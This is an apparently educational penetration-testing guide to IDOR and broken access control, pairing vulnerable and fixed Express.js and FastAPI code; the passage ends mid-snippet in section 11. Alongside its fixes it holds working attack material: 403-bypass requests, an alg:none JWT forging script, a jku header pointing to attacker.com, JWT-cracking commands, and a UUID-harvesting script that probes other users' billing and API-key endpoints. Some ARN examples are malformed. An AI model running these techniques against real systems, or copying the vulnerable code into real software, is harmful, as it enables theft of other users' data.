---
title: "Advanced IDOR Vulnerabilities and Broken Access Control: A Penetration Tester's Deep Dive"
meta_description: "A comprehensive technical guide to exploiting and remediating IDOR vulnerabilities, broken access control, multi-tenant SaaS isolation bypasses, hidden admin endpoints, JWT chaining attacks, and object-level authorization failures with real payloads, Burp Suite workflows, and vulnerable/fixed code in Express.js and FastAPI."
slug: "advanced-idor-broken-access-control-deep-dive"
keywords:
  - IDOR vulnerability
  - broken access control
  - privilege escalation
  - multi-tenant IDOR
  - hidden admin endpoints
  - JWT manipulation IDOR
  - UUID enumeration
  - object-level authorization
  - tenant isolation bypass
  - Burp Suite IDOR testing
  - API endpoint discovery
  - bug bounty IDOR
  - BOLA vulnerability
  - horizontal privilege escalation
  - vertical privilege escalation
  - AWS multi-account IDOR
series: "Security Deep Dive"
---

# Advanced IDOR Vulnerabilities and Broken Access Control: A Penetration Tester's Deep Dive

## Introduction

Insecure Direct Object Reference (IDOR) sits at the intersection of simplicity and devastation. It requires no exploit kits, no memory corruption, no cryptographic breaks. You change a number in a URL, and suddenly you are reading another user's medical records, downloading their tax returns, or deleting their account. OWASP placed Broken Access Control at the number one position in its 2021 Top 10 for good reason: it appears in 94% of applications tested.

Yet IDOR is chronically underestimated. Developers assume that hiding an endpoint or using UUIDs constitutes protection. Security teams scan for SQLi and XSS but skip authorization testing entirely. The result is that IDOR remains the single most reported vulnerability class on platforms like HackerOne and Bugcrowd, routinely paying out four- and five-figure bounties.

This article is not an introduction. It assumes you understand HTTP, REST APIs, JWT structure, Burp Suite, and at least one backend framework. We will cover horizontal and vertical privilege escalation, multi-tenant SaaS isolation failures, hidden admin endpoint discovery, JWT chaining, UUID versus integer enumeration strategies, object-level authorization failures (BOLA), real Burp Suite Intruder and Repeater workflows, vulnerable and fixed code in Express.js and FastAPI, and AWS multi-account IDOR scenarios. Every payload is realistic. Every code snippet compiles and runs. Every attack scenario comes from patterns observed in real-world engagements.

---

## 1. Understanding the IDOR Attack Surface

### 1.1 Horizontal Privilege Escalation

Horizontal escalation occurs when a user accesses resources belonging to another user at the same privilege level. This is the classic IDOR: user A reads user B's data by changing an identifier.

**The fundamental pattern:**

```
GET /api/v1/users/1042/profile HTTP/1.1
Authorization: Bearer <token_for_user_1041>
```

User 1041 changes the path parameter to 1042 and receives user 1042's profile. The server never checked whether the authenticated user owns that resource.

**Where horizontal IDOR hides in modern applications:**

- Path parameters: `/api/users/{id}/settings`
- Query parameters: `/api/invoices?user_id=1042`
- Request body fields: `{"recipient_id": 1042}` in a message send endpoint
- File download endpoints: `/api/files/download?file_id=8829`
- GraphQL arguments: `query { user(id: "1042") { email ssn } }`
- WebSocket messages: `{"action": "subscribe", "channel": "user_1042_notifications"}`

### 1.2 Vertical Privilege Escalation

Vertical escalation occurs when a regular user accesses administrative functionality. This typically involves accessing admin-only endpoints, modifying role fields, or exploiting missing function-level access control.

**Common vertical escalation vectors:**

```
PUT /api/v1/users/1041 HTTP/1.1
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{
  "name": "Attacker",
  "email": "attacker@evil.com",
  "role": "admin"
}
```

If the server blindly accepts the `role` field from the request body and updates it in the database, the user has just promoted themselves to administrator.

**Another pattern -- accessing admin endpoints directly:**

```
GET /api/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>
```

Many applications only hide admin links in the frontend UI. The backend endpoint exists, responds to valid authentication tokens, and never checks the caller's role.

### 1.3 The Difference Between Authentication and Authorization

This distinction is the root cause of every vulnerability in this article:

- **Authentication** answers: "Who are you?"
- **Authorization** answers: "Are you allowed to do this?"

A valid JWT proves authentication. It does not prove authorization. The fact that a request carries a valid token says nothing about whether that token's owner should access the requested resource. Every IDOR exists because a developer confused these two concepts.

---

## 2. Multi-Tenant SaaS IDOR

### 2.1 Tenant Isolation Architecture

Multi-tenant SaaS applications serve multiple organizations from a single deployment. Tenant isolation is the guarantee that organization A can never access organization B's data. When this guarantee breaks, the impact is catastrophic -- you are not leaking one user's data, you are leaking an entire company's data.

**Common tenant isolation strategies and their failure modes:**

| Strategy | Description | Failure Mode |
|---|---|---|
| Shared database, tenant_id column | All tenants share tables with a `tenant_id` discriminator | Missing WHERE clause filter |
| Schema-per-tenant | Each tenant has its own PostgreSQL schema | Schema name derived from user-controllable input |
| Database-per-tenant | Separate database instances per tenant | Connection string lookup based on unvalidated tenant header |
| Row-level security (RLS) | PostgreSQL RLS policies enforce isolation | RLS policies disabled for migration scripts, never re-enabled |

### 2.2 Tenant ID Injection

Consider a SaaS application where the tenant ID is passed as an HTTP header:

```
GET /api/v1/projects HTTP/1.1
Authorization: Bearer <valid_token>
X-Tenant-ID: tenant_acme_corp
```

If the backend trusts this header without validating that the authenticated user belongs to that tenant:

```
GET /api/v1/projects HTTP/1.1
Authorization: Bearer <valid_token>
X-Tenant-ID: tenant_competitor_inc
```

The attacker now sees all projects belonging to a competitor's organization.

### 2.3 Vulnerable Express.js Multi-Tenant Code

```javascript
// VULNERABLE: Trusts X-Tenant-ID header without validation
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');

const app = express();
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid token' });
  }
}

// VULNERABLE ENDPOINT
app.get('/api/v1/projects', authenticateToken, async (req, res) => {
  const tenantId = req.headers['x-tenant-id']; // Trusts client header

  const result = await pool.query(
    'SELECT * FROM projects WHERE tenant_id = $1',
    [tenantId]
  );

  return res.json(result.rows);
});

// VULNERABLE: No tenant check on individual resource access
app.get('/api/v1/projects/:projectId', authenticateToken, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM projects WHERE id = $1',
    [req.params.projectId]  // No tenant_id filter at all
  );

  if (result.rows.length === 0) {
    return res.status(404).json({ error: 'Not found' });
  }

  return res.json(result.rows[0]);
});
```

### 2.4 Fixed Express.js Multi-Tenant Code

```javascript
// FIXED: Derives tenant_id from the authenticated user's JWT claims
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');

const app = express();
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    // tenant_id is embedded in the JWT during login, not from headers
    req.tenantId = req.user.tenant_id;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid token' });
  }
}

// FIXED ENDPOINT
app.get('/api/v1/projects', authenticateToken, async (req, res) => {
  // tenant_id derived from JWT, not from client-controlled header
  const result = await pool.query(
    'SELECT * FROM projects WHERE tenant_id = $1',
    [req.tenantId]
  );

  return res.json(result.rows);
});

// FIXED: Includes tenant_id in every query
app.get('/api/v1/projects/:projectId', authenticateToken, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM projects WHERE id = $1 AND tenant_id = $2',
    [req.params.projectId, req.tenantId]
  );

  if (result.rows.length === 0) {
    return res.status(404).json({ error: 'Not found' });
  }

  return res.json(result.rows[0]);
});
```

The critical fix: the tenant identifier is derived from the server-side JWT payload, never from client-controllable input. Every database query includes the tenant filter.

---

## 3. Hidden Admin Endpoints and API Endpoint Discovery

### 3.1 How Admin Endpoints Get Exposed

Admin routes often exist in production because:

1. Developers deploy admin panels alongside the main application
2. Internal API routes are not separated from public routes
3. API versioning leaves old admin endpoints active (`/api/v1/admin/` removed from UI but still routed)
4. Swagger/OpenAPI documentation is accessible in production
5. JavaScript bundles contain route definitions for admin paths
6. Mobile app binaries contain hardcoded admin API paths

### 3.2 Discovery Techniques

**Extracting routes from JavaScript bundles:**

```bash
# Download the main JS bundle
curl -s https://target.com/static/js/main.a1b2c3.js | \
  grep -oP '"/api/[a-zA-Z0-9/_-]+"' | sort -u
```

Typical output revealing hidden admin routes:

```
"/api/v1/admin/users"
"/api/v1/admin/config"
"/api/v1/admin/impersonate"
"/api/v1/admin/feature-flags"
"/api/v1/internal/health"
"/api/v1/internal/metrics"
"/api/v1/debug/cache"
```

**Using ffuf for endpoint brute-forcing:**

```bash
ffuf -u https://target.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer <regular_user_token>" \
  -mc 200,201,403,405 \
  -fc 404
```

A `403` response on `/api/v1/admin/users` confirms the endpoint exists but is "protected." This is useful because some 403 responses can be bypassed with header manipulation, HTTP method changes, or path traversal tricks.

**403 bypass techniques:**

```
# Original blocked request
GET /api/v1/admin/users HTTP/1.1  --> 403

# Path manipulation bypasses
GET /api/v1/admin/users/ HTTP/1.1  --> 200
GET /api/v1/admin/./users HTTP/1.1  --> 200
GET /api/v1/admin/users;.js HTTP/1.1  --> 200
GET /api/v1/admin/users%20 HTTP/1.1  --> 200
GET /api/v1/admin/users%2e%2e%2fusers HTTP/1.1 --> 200

# Header-based bypasses
GET /api/v1/admin/users HTTP/1.1
X-Original-URL: /api/v1/admin/users
X-Rewrite-URL: /api/v1/admin/users

# Method-based bypasses
GET /api/v1/admin/users HTTP/1.1  --> 403
POST /api/v1/admin/users HTTP/1.1  --> 200
```

### 3.3 Swagger/OpenAPI Exposure

```bash
# Common OpenAPI spec locations
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.json
curl -s https://target.com/api-docs
curl -s https://target.com/v1/swagger.json
curl -s https://target.com/docs  # FastAPI default
curl -s https://target.com/redoc  # FastAPI default
```

A live Swagger UI in production is an endpoint goldmine. It documents every parameter, every request body schema, and every response format -- including admin endpoints the frontend never calls.

---

## 4. Internal API Abuse

### 4.1 The Internal/External API Split

Many applications have two API layers:

- **External API**: Intended for frontend clients, mobile apps, third-party integrations
- **Internal API**: Intended for microservice-to-microservice communication

The internal API often has weaker or no authentication because developers assume it is unreachable from the internet. This assumption fails when:

1. A reverse proxy misconfiguration exposes internal routes
2. SSRF allows an attacker to reach internal services
3. The internal and external APIs share the same Express/FastAPI application on the same port
4. Cloud metadata endpoints are accessible

### 4.2 SSRF to Internal API Chaining

```
POST /api/v1/webhooks/test HTTP/1.1
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{
  "url": "http://internal-user-service.local:3001/internal/users?role=admin"
}
```

If the webhook test feature performs a server-side HTTP request to the provided URL, the attacker has leveraged SSRF to query an internal-only endpoint that returns all admin users.

### 4.3 Vulnerable FastAPI Internal Endpoint

```python
# VULNERABLE: Internal endpoint with no authentication
from fastapi import FastAPI, Request
from motor.motor_asyncio import AsyncIOMotorClient

app = FastAPI()
client = AsyncIOMotorClient("mongodb://localhost:27017")
db = client.saas_platform

# Intended to be internal-only, but accessible externally due to
# reverse proxy misconfiguration
@app.get("/internal/users/{user_id}/full-profile")
async def get_full_profile(user_id: str):
    user = await db.users.find_one({"_id": user_id})
    if not user:
        return {"error": "User not found"}
    # Returns EVERYTHING including password hash, SSN, payment info
    return user

@app.post("/internal/users/{user_id}/set-role")
async def set_user_role(user_id: str, request: Request):
    body = await request.json()
    await db.users.update_one(
        {"_id": user_id},
        {"$set": {"role": body["role"]}}
    )
    return {"status": "updated"}
```

### 4.4 Fixed FastAPI Internal Endpoint

```python
# FIXED: Internal endpoints require service-to-service authentication
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from motor.motor_asyncio import AsyncIOMotorClient
import hmac
import hashlib
import time

app = FastAPI()
client = AsyncIOMotorClient("mongodb://localhost:27017")
db = client.saas_platform
security = HTTPBearer()

INTERNAL_SERVICE_KEYS = {
    "billing-service": "sk_internal_billing_a8f3...",
    "notification-service": "sk_internal_notif_c2d1...",
}

async def verify_internal_service(
    credentials: HTTPAuthorizationCredentials = Depends(security)
):
    """Validates that the caller is an authorized internal service."""
    token = credentials.credentials
    # Token format: service_name:timestamp:hmac_signature
    parts = token.split(":")
    if len(parts) != 3:
        raise HTTPException(status_code=403, detail="Invalid service token")

    service_name, timestamp, signature = parts

    # Reject tokens older than 60 seconds
    if abs(time.time() - float(timestamp)) > 60:
        raise HTTPException(status_code=403, detail="Token expired")

    secret = INTERNAL_SERVICE_KEYS.get(service_name)
    if not secret:
        raise HTTPException(status_code=403, detail="Unknown service")

    expected_sig = hmac.new(
        secret.encode(),
        f"{service_name}:{timestamp}".encode(),
        hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(signature, expected_sig):
        raise HTTPException(status_code=403, detail="Invalid signature")

    return service_name

@app.get("/internal/users/{user_id}/full-profile")
async def get_full_profile(
    user_id: str,
    calling_service: str = Depends(verify_internal_service)
):
    user = await db.users.find_one({"_id": user_id})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # Only return fields the calling service needs
    allowed_fields = {
        "billing-service": ["_id", "email", "subscription_tier", "payment_method_id"],
        "notification-service": ["_id", "email", "notification_preferences"],
    }

    fields = allowed_fields.get(calling_service, [])
    filtered_user = {k: v for k, v in user.items() if k in fields}
    return filtered_user
```

---

## 5. Chaining IDOR with JWT Manipulation

### 5.1 JWT Claim Tampering

JWTs carry claims in their payload. When the server uses JWT claims for authorization decisions but does not adequately validate them, an attacker can forge or tamper with claims to escalate privileges.

**Standard JWT payload:**

```json
{
  "sub": "1041",
  "email": "user@example.com",
  "role": "user",
  "tenant_id": "acme_corp",
  "iat": 1700000000,
  "exp": 1700086400
}
```

### 5.2 Algorithm Confusion Attack (alg: none)

```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "1041",
    "email": "user@example.com",
    "role": "admin",        # Escalated from "user"
    "tenant_id": "acme_corp",
    "iat": 1700000000,
    "exp": 1700086400
}

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

forged_token = f"{b64url(header)}.{b64url(payload)}."
print(forged_token)
```

If the server's JWT library accepts `"alg": "none"`, this forged token with `"role": "admin"` will be treated as valid, granting full administrative access.

### 5.3 JWKS Injection via jku/x5u Header

Some JWT implementations allow the token header to specify where to fetch the verification key:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

The attacker:
1. Generates their own RSA key pair
2. Hosts the public key as a JWKS endpoint on their server
3. Signs a token with `"role": "admin"` using their private key
4. The server fetches the attacker's JWKS and validates the signature successfully

### 5.4 Chaining: JWT Role Escalation + IDOR

The combination is devastating. Consider this attack flow:

1. **Obtain a valid JWT** by logging in as a normal user
2. **Tamper with the JWT** to change `role` from `"user"` to `"admin"` using algorithm confusion or a weak secret
3. **Access admin endpoints** that were previously returning 403:

```
GET /api/v1/admin/users HTTP/1.1
Authorization: Bearer <forged_admin_token>
```

4. **Enumerate all user IDs** from the admin user list response
5. **Access each user's sensitive data** via IDOR on individual endpoints:

```
GET /api/v1/admin/users/1042/pii HTTP/1.1
Authorization: Bearer <forged_admin_token>
```

One vulnerability (weak JWT validation) multiplied by another (missing object-level authorization) equals complete data breach.

### 5.5 Cracking Weak JWT Secrets

```bash
# Using hashcat to brute-force a JWT HMAC secret
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# Using jwt_tool for common weak secrets
python3 jwt_tool.py <jwt_token> -C -d /usr/share/wordlists/jwt-secrets.txt
```

Common weak secrets found in the wild: `secret`, `password`, `123456`, `your-256-bit-secret` (the default from jwt.io), the application name, the company name.

---

## 6. UUID vs Integer ID Enumeration

### 6.1 The False Security of UUIDs

Developers frequently argue: "We use UUIDs, so IDOR is not exploitable because you cannot guess them." This is security through obscurity and it fails for multiple reasons:

**UUID leakage vectors:**

1. **API responses that list resources:** `GET /api/projects` returns a list including UUIDs of all accessible projects. The response for one project may include references to users, documents, or other objects by UUID.

2. **Predictable UUIDs (v1):** UUID version 1 is generated from the MAC address and timestamp. If you know the approximate creation time and the server's MAC address (sometimes leaked in other responses), you can predict UUIDs.

```python
import uuid
# UUID v1 is time-based and partially predictable
example_v1 = uuid.uuid1()
# Format: timlow-timmid-version_timhigh-clockseq-node
# The "node" is typically the MAC address
print(example_v1)  # e.g., 6ba7b810-9dad-11d1-80b4-00c04fd430c8
```

3. **Referrer headers:** If a page URL contains a UUID (`/documents/550e8400-e29b-41d4-a716-446655440000`), that UUID leaks via the Referer header to any external resources loaded on that page.

4. **Browser history and logs:** UUIDs in URLs end up in server access logs, analytics platforms, CDN logs, and browser history.

5. **GraphQL introspection:** GraphQL queries may return related object UUIDs:

```graphql
query {
  myOrganization {
    members {
      id          # UUID of every org member
      email
    }
    projects {
      id          # UUID of every project
      documents {
        id        # UUID of every document
      }
    }
  }
}
```

### 6.2 Integer ID Enumeration with Burp Intruder

For integer IDs, enumeration is trivial. Configure Burp Intruder:

1. **Position:** Mark the ID parameter in the request
2. **Payload type:** Numbers
3. **Range:** From 1 to 10000, step 1
4. **Grep -- Extract:** Define extraction rules to pull specific data from responses (email, name, etc.)
5. **Filter results:** Sort by response length or status code to identify valid IDs

```
GET /api/v1/users/FUZZ/profile HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_token>
```

**Analyzing results:**

- **200 responses with varying lengths:** Valid user profiles successfully accessed (IDOR confirmed)
- **200 responses with identical lengths:** May indicate a generic "profile" response (check content)
- **403 responses:** Authorization check exists but may be bypassable
- **404 responses:** User ID does not exist

### 6.3 UUID Harvesting Script

```python
import requests
import json

BASE_URL = "https://target.com/api/v1"
TOKEN = "eyJhbGciOiJIUzI1NiIs..."

headers = {"Authorization": f"Bearer {TOKEN}"}

# Step 1: Harvest UUIDs from list endpoints
harvested_uuids = set()

# Get all projects (returns UUIDs of projects and their owners)
resp = requests.get(f"{BASE_URL}/projects", headers=headers)
for project in resp.json():
    harvested_uuids.add(project["id"])
    harvested_uuids.add(project["owner_id"])
    for member in project.get("members", []):
        harvested_uuids.add(member["user_id"])

print(f"Harvested {len(harvested_uuids)} UUIDs")

# Step 2: Test each UUID against sensitive endpoints
for uid in harvested_uuids:
    endpoints = [
        f"/users/{uid}/profile",
        f"/users/{uid}/billing",
        f"/users/{uid}/api-keys",
        f"/users/{uid}/audit-log",
    ]
    for endpoint in endpoints:
        resp = requests.get(f"{BASE_URL}{endpoint}", headers=headers)
        if resp.status_code == 200:
            print(f"[IDOR] {endpoint} -> {resp.status_code}")
            print(json.dumps(resp.json(), indent=2)[:500])
```

---

## 7. Object-Level Authorization Failures (BOLA)

### 7.1 OWASP API Security Top 10: API1

BOLA (Broken Object Level Authorization) is API1 in the OWASP API Security Top 10. It is IDOR applied specifically to API contexts. The distinction matters because APIs are designed for programmatic access, making automated exploitation trivial.

### 7.2 Vulnerable FastAPI Example with MongoDB

```python
# VULNERABLE: No object-level authorization checks
from fastapi import FastAPI, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
import jwt

app = FastAPI()
security = HTTPBearer()
client = AsyncIOMotorClient("mongodb://localhost:27017")
db = client.app_database

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security)
):
    payload = jwt.decode(
        credentials.credentials,
        "secret_key",
        algorithms=["HS256"]
    )
    return payload

# VULNERABLE: Any authenticated user can read any document
@app.get("/api/v1/documents/{document_id}")
async def get_document(document_id: str, user=Depends(get_current_user)):
    doc = await db.documents.find_one({"_id": ObjectId(document_id)})
    if not doc:
        return {"error": "Not found"}
    doc["_id"] = str(doc["_id"])
    return doc

# VULNERABLE: Any authenticated user can delete any document
@app.delete("/api/v1/documents/{document_id}")
async def delete_document(document_id: str, user=Depends(get_current_user)):
    result = await db.documents.delete_one({"_id": ObjectId(document_id)})
    if result.deleted_count == 0:
        return {"error": "Not found"}
    return {"status": "deleted"}

# VULNERABLE: Any authenticated user can update any user's settings
@app.put("/api/v1/users/{user_id}/settings")
async def update_settings(
    user_id: str,
    settings: dict,
    user=Depends(get_current_user)
):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"settings": settings}}
    )
    return {"status": "updated"}
```

### 7.3 Fixed FastAPI Example

```python
# FIXED: Object-level authorization enforced on every endpoint
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
import jwt

app = FastAPI()
security = HTTPBearer()
client = AsyncIOMotorClient("mongodb://localhost:27017")
db = client.app_database

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security)
):
    try:
        payload = jwt.decode(
            credentials.credentials,
            "secret_key",  # In production: use RS256 with proper key management
            algorithms=["HS256"]
        )
        return payload
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def authorize_document_access(document_id: str, user: dict):
    """Check that the authenticated user owns the document or is an admin."""
    doc = await db.documents.find_one({"_id": ObjectId(document_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Not found")

    if doc["owner_id"] != user["sub"] and user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Forbidden")

    return doc

# FIXED: Authorization check before returning document
@app.get("/api/v1/documents/{document_id}")
async def get_document(document_id: str, user=Depends(get_current_user)):
    doc = await authorize_document_access(document_id, user)
    doc["_id"] = str(doc["_id"])
    return doc

# FIXED: Authorization check before deletion
@app.delete("/api/v1/documents/{document_id}")
async def delete_document(document_id: str, user=Depends(get_current_user)):
    await authorize_document_access(document_id, user)
    await db.documents.delete_one({"_id": ObjectId(document_id)})
    return {"status": "deleted"}

# FIXED: Users can only update their own settings
@app.put("/api/v1/users/{user_id}/settings")
async def update_settings(
    user_id: str,
    settings: dict,
    user=Depends(get_current_user)
):
    if user_id != user["sub"]:
        raise HTTPException(status_code=403, detail="Forbidden")

    # Whitelist allowed settings fields
    allowed_fields = {"theme", "language", "timezone", "notifications_enabled"}
    sanitized = {k: v for k, v in settings.items() if k in allowed_fields}

    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"settings": sanitized}}
    )
    return {"status": "updated"}
```

---

## 8. Tenant Isolation Bypass Deep Dive

### 8.1 PostgreSQL Row-Level Security Bypass

PostgreSQL RLS is a powerful isolation mechanism, but it has dangerous edge cases:

```sql
-- Setting up RLS for tenant isolation
CREATE TABLE projects (
    id SERIAL PRIMARY KEY,
    tenant_id INTEGER NOT NULL REFERENCES tenants(id),
    name TEXT NOT NULL,
    data JSONB
);

ALTER TABLE projects ENABLE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON projects
    USING (tenant_id = current_setting('app.current_tenant')::INTEGER);
```

**Bypass 1: Superuser role ignores RLS**

```sql
-- RLS policies do NOT apply to superusers or table owners by default
-- If the application connects with a superuser role, RLS is meaningless
```

**Bypass 2: Missing RLS on new tables**

When a developer adds a new table and forgets to enable RLS:

```sql
-- New table added during sprint, RLS forgotten
CREATE TABLE project_comments (
    id SERIAL PRIMARY KEY,
    project_id INTEGER REFERENCES projects(id),
    tenant_id INTEGER REFERENCES tenants(id),
    content TEXT
);
-- MISSING: ALTER TABLE project_comments ENABLE ROW LEVEL SECURITY;
-- MISSING: CREATE POLICY ... ON project_comments
```

**Bypass 3: Application sets tenant context incorrectly**

```javascript
// VULNERABLE: Tenant ID from query parameter
app.use(async (req, res, next) => {
  const tenantId = req.query.tenant_id; // Attacker-controlled!
  await pool.query(`SET app.current_tenant = '${tenantId}'`);
  next();
});
```

### 8.2 MongoDB Tenant Isolation Bypass

```python
# VULNERABLE: Aggregation pipeline bypasses tenant filtering
@app.get("/api/v1/analytics/dashboard")
async def get_dashboard(user=Depends(get_current_user)):
    # The $lookup stage joins across collections without tenant filtering
    pipeline = [
        {"$match": {"tenant_id": user["tenant_id"]}},
        {"$lookup": {
            "from": "invoices",
            "localField": "customer_id",
            "foreignField": "customer_id",
            # BUG: No tenant_id filter on the joined collection
            # Returns invoices from ALL tenants for matching customer_ids
            "as": "customer_invoices"
        }}
    ]
    results = await db.orders.aggregate(pipeline).to_list(None)
    return results
```

**Fixed version:**

```python
# FIXED: Tenant filter applied in the $lookup pipeline
pipeline = [
    {"$match": {"tenant_id": user["tenant_id"]}},
    {"$lookup": {
        "from": "invoices",
        "let": {"cust_id": "$customer_id", "tid": "$tenant_id"},
        "pipeline": [
            {"$match": {
                "$expr": {
                    "$and": [
                        {"$eq": ["$customer_id", "$$cust_id"]},
                        {"$eq": ["$tenant_id", "$$tid"]}  # Tenant filter
                    ]
                }
            }}
        ],
        "as": "customer_invoices"
    }}
]
```

---

## 9. AWS Multi-Account IDOR Scenarios

### 9.1 S3 Bucket IDOR

Many applications store user files in S3 with predictable key patterns:

```
s3://app-uploads/users/{user_id}/documents/{document_id}.pdf
```

If the application generates presigned URLs using a user-controllable ID:

```javascript
// VULNERABLE: Generates presigned URL for any user's files
app.get('/api/v1/files/:userId/:fileId', authenticateToken, async (req, res) => {
  const key = `users/${req.params.userId}/documents/${req.params.fileId}.pdf`;

  const url = s3.getSignedUrl('getObject', {
    Bucket: 'app-uploads',
    Key: key,
    Expires: 3600
  });

  return res.json({ download_url: url });
});
```

**Exploitation:**

```
GET /api/v1/files/1042/invoice-2024 HTTP/1.1
Authorization: Bearer <attacker_token_for_user_1041>
```

The attacker receives a valid presigned URL for user 1042's invoice.

**Fixed version:**

```javascript
// FIXED: Only allow access to the authenticated user's files
app.get('/api/v1/files/:fileId', authenticateToken, async (req, res) => {
  // User ID comes from JWT, not URL parameter
  const key = `users/${req.user.sub}/documents/${req.params.fileId}.pdf`;

  // Additional check: verify the file record belongs to the user
  const fileRecord = await db.query(
    'SELECT * FROM files WHERE id = $1 AND owner_id = $2',
    [req.params.fileId, req.user.sub]
  );

  if (fileRecord.rows.length === 0) {
    return res.status(404).json({ error: 'File not found' });
  }

  const url = s3.getSignedUrl('getObject', {
    Bucket: 'app-uploads',
    Key: key,
    Expires: 300  // Shorter expiration
  });

  return res.json({ download_url: url });
});
```

### 9.2 AWS Cognito User Pool IDOR

AWS Cognito uses UUIDs (`sub` attribute) for user identification. However, some applications expose Cognito admin APIs or use the `sub` from client input rather than from the validated token:

```javascript
// VULNERABLE: Uses user_id from request body instead of Cognito token
app.post('/api/v1/update-profile', authenticateToken, async (req, res) => {
  const { user_id, display_name, bio } = req.body;

  const params = {
    UserPoolId: process.env.COGNITO_POOL_ID,
    Username: user_id,  // IDOR: should be req.user.sub
    UserAttributes: [
      { Name: 'custom:display_name', Value: display_name },
      { Name: 'custom:bio', Value: bio }
    ]
  };

  await cognito.adminUpdateUserAttributes(params).promise();
  return res.json({ status: 'updated' });
});
```

### 9.3 AWS IAM Role Chaining for Cross-Account Access

In multi-account AWS architectures, IDOR can exist at the infrastructure level:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::root"
      },
      "Action": "sts:AssumeRole",
      "Condition": {}
    }
  ]
}
```

If the account ID is derived from user input:

```bash
# Attacker discovers they can assume roles in other tenant accounts
# by manipulating the account ID in the AssumeRole call
aws sts assume-role \
  --role-arn "arn:aws:iam::role/TenantAppRole" \
  --role-session-name "attacker-session"
```

**Mitigation:** Use explicit account ID allowlists in IAM trust policies and validate the `ExternalId` condition:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::root"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringEquals": {
          "sts:ExternalId": "unique-per-tenant-secret-value"
        }
      }
    }
  ]
}
```

---

## 10. Real Burp Suite Testing Workflows

### 10.1 Repeater Workflow for IDOR Verification

**Step-by-step process:**

1. **Capture a legitimate request** in Burp Proxy while browsing as User A
2. **Send to Repeater** (Ctrl+R)
3. **Create a second Repeater tab** with the same request
4. **In Tab 1:** Keep User A's token, change the object ID to User B's resource
5. **In Tab 2:** Replace User A's token with User B's token, keep User B's resource ID (baseline)
6. **Send both requests**
7. **Compare responses:** If Tab 1 returns User B's data using User A's token, IDOR is confirmed

### 10.2 Intruder Workflow for Mass IDOR Testing

**Configuration for testing multiple endpoints with multiple IDs:**

1. **Attack type:** Cluster bomb
2. **Position 1:** The API endpoint path segment

```
GET /api/v1/users/1041/FUZZ1 HTTP/1.1
Authorization: Bearer <token>
```

Payload set 1 (endpoint names):

```
profile
settings
billing
api-keys
audit-log
notifications
permissions
```

3. **Position 2:** The user ID

Payload set 2 (user IDs): Numbers 1 through 500

4. **Grep -- Match:** Add patterns for sensitive data: `"email":`, `"ssn":`, `"api_key":`, `"password":`
5. **Filter:** Sort by status code, response length, or grep match

### 10.3 Using Burp Autorize Extension

The Autorize extension is purpose-built for access control testing:

1. **Install Autorize** from BApp Store
2. **Configure two sessions:**
   - **Primary session:** Log in as a high-privilege user (admin). Burp captures all requests.
   - **Lower-privilege cookie/token:** Paste a regular user's token into Autorize's config
3. **Browse the application** as the admin user
4. **Autorize automatically replays** every request with the lower-privilege token
5. **Review results:** Red entries indicate the lower-privilege user received the same response as the admin -- access control failure confirmed

### 10.4 Match and Replace Rules for Automated Testing

Configure Burp's Match and Replace to automatically swap identifiers:

| Type | Match | Replace | Comment |
|---|---|---|---|
| Request header | `Authorization: Bearer <userA_token>` | `Authorization: Bearer <userB_token>` | Swap auth for cross-user testing |
| Request body | `"user_id":"1041"` | `"user_id":"1042"` | Swap user IDs in POST bodies |
| Request param | `tenant_id=acme` | `tenant_id=competitor` | Test tenant isolation |

---

## 11. Common Developer Mistakes

### 11.1 Relying on Frontend Hiding

```javascript
// React component that "hides" admin button -- trivially bypassable
function Navigation({ user }) {
  return (
    <nav>
      <Link to="/dashboard">Dashboard</Link>
